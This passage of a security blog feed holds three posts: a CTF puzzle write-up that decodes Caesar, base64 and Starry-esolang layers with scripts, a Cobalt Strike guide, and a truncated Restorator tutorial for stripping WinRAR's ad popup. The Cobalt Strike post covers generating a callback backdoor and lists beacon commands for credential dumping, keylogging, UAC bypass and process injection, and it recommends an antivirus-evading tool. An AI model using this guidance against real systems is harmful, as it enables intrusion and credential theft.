zphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhLzBhJDBhJDBhLxphJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphMjBvJD4hLzBhJDBhMjBhJDBhDjthJDBhJDBhJDthJDphJDBhJDBsLjBrJDthJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBLJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJBphJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJBphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhMjBhJDBhMjBhJDBhMjBhJDBhDj4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphMjBvJDthMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBLJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4=</span><br></pre></td></tr></table></figure><blockquote><p>看到末尾的=，想到base64，所以是凯撒与base64的结合。</p><p>先用脚本爆破凯撒，将结果用base64编码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"># 截取文件最前面一部分进行猜测，因为根据后面可知这一部分是近似的四字符反复重复</span><br><span class="line">key = &quot;JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBh&quot;</span><br><span class="line"> </span><br><span class="line"># 遍历凯撒加密中25种的可能性</span><br><span class="line">for n in range(0, 26):</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    for letter in key:</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line"> </span><br><span class="line">    # 输出每一种可能性最后的结果</span><br><span class="line">    print(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241119234133869.png" alt="image-20241119234133869"></p><blockquote><p>结果中发现只有当n=25时，会出现starry语言特有的+，*等符号</p><p>于是用脚本将其全部转化成starry语言</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">with open(&quot;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    #flag.txt是凯撒密码的文本</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    n = 25</span><br><span class="line">    for letter in f.read():</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line">    open(&quot;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&quot;, &quot;wb&quot;).write(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><blockquote><p>最后用starry语言转换脚本转换就能得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&#x27;)     #flag.starry是保存的starry语言文件</span><br><span class="line">data = fp.read()</span><br><span class="line">fs = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;, &#x27;w&#x27;)       #f.txt是输出的中间文件</span><br><span class="line">sub = 0</span><br><span class="line">for i in data:</span><br><span class="line">    if i == &#x27;\n&#x27;:</span><br><span class="line">        continue</span><br><span class="line">    elif i == &#x27; &#x27;:</span><br><span class="line">        sub += 1</span><br><span class="line">    elif i == &#x27;+&#x27;:</span><br><span class="line">        if sub == 1:</span><br><span class="line">            fs.write(&#x27;dup\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;swap\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;rotate\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;pop\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;push  &#x27; + str(sub-5) + &#x27;\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    elif i == &#x27;*&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;+\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 1:</span><br><span class="line">            fs.write(&#x27;-\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;*\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;/\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;%\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;error!!!&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">            sys.exit()</span><br><span class="line">    elif i == &#x27;.&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;num_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;char_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">fp.close()</span><br><span class="line">fs.close()</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">data = []</span><br><span class="line">for line in fp:</span><br><span class="line">    line = line.strip(&#x27;\n&#x27;)</span><br><span class="line">    if line[:4] == &#x27;push&#x27;:</span><br><span class="line">        data.append(int(line.split(&#x27;  &#x27;)[1]))</span><br><span class="line">    elif line == &#x27;*&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x * y)</span><br><span class="line">    elif line == &#x27;+&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x + y)</span><br><span class="line">    elif line == &#x27;-&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        if (x-y)&lt;0:</span><br><span class="line">            data.append(y-x)</span><br><span class="line">        else:</span><br><span class="line">            data.append(x-y)</span><br><span class="line">    elif line == &#x27;dup&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data.append(x)</span><br><span class="line">    elif line == &#x27;char_out&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data = data[:-1]</span><br><span class="line">        print(chr(x),end=&quot;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><blockquote><p>flag{785c45ea-d2a1-4993-8d4f-325323d5bcd9}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧华科第一届网络安全挑战赛wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike4.8汉化版带插件使用方法</title>
    <link href="https://m3x1.cn/posts/4aeca11a.html"/>
    <id>https://m3x1.cn/posts/4aeca11a.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:35.855Z</updated>
    
    <content type="html"><![CDATA[<h1>CobaltStrike4.8汉化版带插件使用方法</h1><p>使用大致流程<br>创建团队服务器-&gt;客户端连接服务器-&gt;创建监听器-&gt;生成后门对应监听器-&gt;靶机运行后门成功上线-&gt;后渗透（提权，内网漫游，域渗透等）</p><h2 id="一、安装">一、安装</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="在这里插入图片描述"><br>把全部文件下上传到外网VPS上，并给足权限<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="在这里插入图片描述"><br>服务端运行起来<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="在这里插入图片描述"></p><p>本地电脑使用<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;spm=1001.2101.3001.7020">客户端</a>连接即可<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="在这里插入图片描述"><br>主要输入<code>HOST、Port、password</code>即可</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="在这里插入图片描述"></p><h2 id="二、上线">二、上线</h2><h3 id="1、设置监听器">1、设置监听器</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="在这里插入图片描述"></p><h3 id="2、生成木马后门">2、生成木马后门</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="在这里插入图片描述"><br>运行即可上线CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="在这里插入图片描述"></p><p>3、指令大全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 注入受害者浏览器进程</span><br><span class="line">sleep 3 全部命令3秒执行</span><br><span class="line">bypassuac 绕过UAC</span><br><span class="line">cancel 取消正在进行的下载</span><br><span class="line">cd 切换目录</span><br><span class="line">checkin 强制让被控端回连一次</span><br><span class="line">clear 清除beacon内部的任务队列</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn 部署Covert VPN客户端</span><br><span class="line">cp 复制文件</span><br><span class="line">dcsync 从DC中提取密码哈希</span><br><span class="line">desktop 远程VNC</span><br><span class="line">dllinject 反射DLL注入进程</span><br><span class="line">dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line">download 下载文件</span><br><span class="line">downloads 列出正在进行的文件下载</span><br><span class="line">drives 列出目标盘符</span><br><span class="line">elevate 尝试提权</span><br><span class="line">execute 在目标上执行程序(无输出)</span><br><span class="line">execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line">exit 退出beacon</span><br><span class="line">getprivs Enable system privileges oncurrent token</span><br><span class="line">getsystem 尝试获取SYSTEM权限</span><br><span class="line">getuid 获取用户ID</span><br><span class="line">hashdump 转储密码哈希值</span><br><span class="line">help 帮助</span><br><span class="line">inject 在特定进程中生成会话</span><br><span class="line">jobkill 杀死一个后台任务</span><br><span class="line">jobs 列出后台任务</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line">kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line">keylogger 键盘记录</span><br><span class="line">kill 结束进程</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line">ls 列出文件</span><br><span class="line">make_token 创建令牌以传递凭据</span><br><span class="line">mimikatz 运行mimikatz</span><br><span class="line">mkdir 创建一个目录</span><br><span class="line">mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">mode http 使用HTTP作为通信通道</span><br><span class="line">mv 移动文件</span><br><span class="line">net net命令</span><br><span class="line">note 备注</span><br><span class="line">portscan 进行端口扫描</span><br><span class="line">powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import 导入powershell脚本</span><br><span class="line">ppid Set parent PID forspawned post-ex jobs</span><br><span class="line">ps 显示进程列表</span><br><span class="line">psexec Use a service to spawn asession on a host</span><br><span class="line">psexec_psh Use PowerShell to spawn asession on a host</span><br><span class="line">psinject 在特定进程中执行PowerShell命令</span><br><span class="line">pth 使用Mimikatz进行传递哈希</span><br><span class="line">pwd 当前目录位置</span><br><span class="line">reg Query the registry</span><br><span class="line">rev2self 恢复原始令牌</span><br><span class="line">rm 删除文件或文件夹</span><br><span class="line">rportfwd 端口转发</span><br><span class="line">run 在目标上执行程序(返回输出)</span><br><span class="line">runas 以另一个用户权限执行程序</span><br><span class="line">runasadmin 在高权限下执行程序</span><br><span class="line">runu Execute a program underanother PID</span><br><span class="line">screenshot 屏幕截图</span><br><span class="line">setenv 设置环境变量</span><br><span class="line">shell cmd.exe  打开cmd终端</span><br><span class="line">shell ipconfig 执行ipconfig命令</span><br><span class="line">shinject 将shellcode注入进程</span><br><span class="line">shspawn 生成进程并将shellcode注入其中</span><br><span class="line">sleep 设置睡眠延迟时间</span><br><span class="line">socks 启动SOCKS4代理</span><br><span class="line">socks stop 停止SOCKS4</span><br><span class="line">spawn Spawn a session</span><br><span class="line">spawnas Spawn a session as anotheruser</span><br><span class="line">spawnto Set executable tospawn processes into</span><br><span class="line">spawnu Spawn a session underanother PID</span><br><span class="line">ssh 使用ssh连接远程主机</span><br><span class="line">ssh-key 使用密钥连接远程主机</span><br><span class="line">steal_token 从进程中窃取令牌</span><br><span class="line">timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line">unlink Disconnect from parentBeacon</span><br><span class="line">upload 上传文件</span><br><span class="line">wdigest 使用mimikatz转储明文凭据</span><br><span class="line">winrm 使用WinRM在主机上生成会话</span><br><span class="line">wmi 使用WMI在主机上生成会话</span><br><span class="line">argue 进程参数欺骗</span><br></pre></td></tr></table></figure><p>简单执行命令<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 全部命令3秒执行(默认时60秒太长，)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令要在命令前加个shell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="在这里插入图片描述"></p><h2 id="三、如何加载插件及EXE？">三、如何加载插件及EXE？</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="在这里插入图片描述"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="在这里插入图片描述"><br><strong>如果不想加载插件想直接上传成品exe文件也是可以的</strong><br>Ladon插件/工具体积小、免杀<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="在这里插入图片描述"><br>可以利用CS自身文件上传功能上传成品的exe或者直接使用插件<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="在这里插入图片描述"></p><p>四、联动MSF<br>1、CS-&gt;MSF(CS把权限转交给MSF)</p><p><strong>CS：</strong><br>新建个监听器（监听的协议要与MSF一致，这里监听HTTP协议，那么MSF也要监听HTTP协议）<br>CS监听的协议是windows/foreign/reverse_http字样</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="在这里插入图片描述"></p><p>spawn msf （要联动的会话上执行该命令）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">🥧CobaltStrike4.8汉化版带插件使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Restorator常见使用方法</title>
    <link href="https://m3x1.cn/posts/1586e22.html"/>
    <id>https://m3x1.cn/posts/1586e22.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:59.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Restorator常见使用方法有哪些？">Restorator常见使用方法有哪些？</h2><h3 id="案例一：解决WinRAR弹出广告">案例一：解决WinRAR弹出广告</h3><h4 id="1、导出rc文件">1、导出rc文件</h4><p>WinRAR安装完成后，用Restorator 2018打开安装目录WinRAR.exe。点开“打开”对话框后，通过WinRAR的安装路径，找到这个exe程序，然后点击“打开”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第2张"></p><p>Restorator 2018界面主要分为左右两个区，左边是资源树，我们点击“字符串”左边的加号，在展开的项目中，右键点击“中文”，然后选择“导出”→“导出为.rc”，保存到桌面：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第3张"></p><h4 id="2、打开rc文件">2、打开rc文件</h4><p>上一步会导出一个.rc后缀的文件到指定位置。这一步我们去找到这个文件。如下图所示，我将导出的文件命名为“WinRAR导出分析-中文(简体，中-国).rc”，找到它，右键点开菜单后选择“打开方式”，然后用记事本的方式打开它也可以用文本编辑工具（<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>）修改：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第4张"></p><p>注意选择用记事本打开这个.rc文件时，不要勾选“始终用此应用打开.rc文件”。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第5张"></p><h4 id="3、定位弹广代码">3、定位弹广代码</h4><p>这一步很关键。下图就是用记事本打开.rc文件的样子，可以看到每一行都有个序数，后面引号里是一个可执行操作的名字。我们需要找到有关弹窗广告的代码，并用合适的方式覆盖它。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第6张"></p><p>由于WinRAR在不停的更新中，所有新老版本的WinRAR将会有区别。我的WinRAR版本为中文版6.02，涉及弹窗的代码在第1277行。如果你用的WinRAR是其他版本，有可能不是第1277行，但是大致也跑不了1000~1300之间，特征是前后都一、两条网址。由于这个代码行，相对于其他中文还是很明显的，仔细找一下并不是很麻烦。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第7张"></p><h4 id="4、覆盖弹广代码">4、覆盖弹广代码</h4><p>找到弹窗代码后删除，改为</p><blockquote><p>“Reminder dialog 